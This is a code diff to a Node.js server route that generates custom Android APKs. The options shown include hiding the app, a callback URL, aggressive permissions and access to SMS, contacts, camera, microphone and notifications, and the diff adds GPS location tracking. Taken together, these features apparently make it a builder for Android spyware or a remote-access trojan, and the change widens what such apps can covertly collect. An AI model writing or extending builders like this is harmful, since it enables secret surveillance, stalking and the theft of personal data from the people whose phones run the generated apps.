@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, packageName: userPackageName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
+    const { uuid, appName, packageName: userPackageName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, enableLocationPermission, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -278,6 +278,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
                 enableCameraPermission: enableCameraPermission === 'true',
                 enableMicrophonePermission: enableMicrophonePermission === 'true',
+                enableLocationPermission: enableLocationPermission === 'true',
                 enableNotificationListener: enableNotificationListener === 'true',
                 aggressivePermissions: aggressivePermissions === 'true',
                 notificationClickAction: notificationClickAction || "device_info"
@@ -322,6 +323,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     'android.permission.RECEIVE_SMS',
                     'android.permission.READ_CONTACTS',
                     'android.permission.MANAGE_OWN_CALLS',
+                    'android.permission.ACCESS_FINE_LOCATION',
+                    'android.permission.ACCESS_COARSE_LOCATION',
+                    'android.permission.FOREGROUND_SERVICE_LOCATION'
                 ];
                 for (const perm of stripPerms) {
                     manifestContent = manifestContent.replace(new RegExp(`\\s*<uses-permission[^>]*android:name="${perm.replace(/\./g, '\\.')}"[^>]*/>`, 'g'), '');
@@ -361,6 +365,13 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
                         permissionsToAdd += '    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />\n';
                         console.log('[APK] Adding MICROPHONE permissions');
+                    }
+
+                    if (enableLocationPermission === 'true') {
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n';
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />\n';
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />\n';
+                        console.log('[APK] Adding LOCATION permissions');
                     }
 
                     if (enableSmsPermission === 'true') {
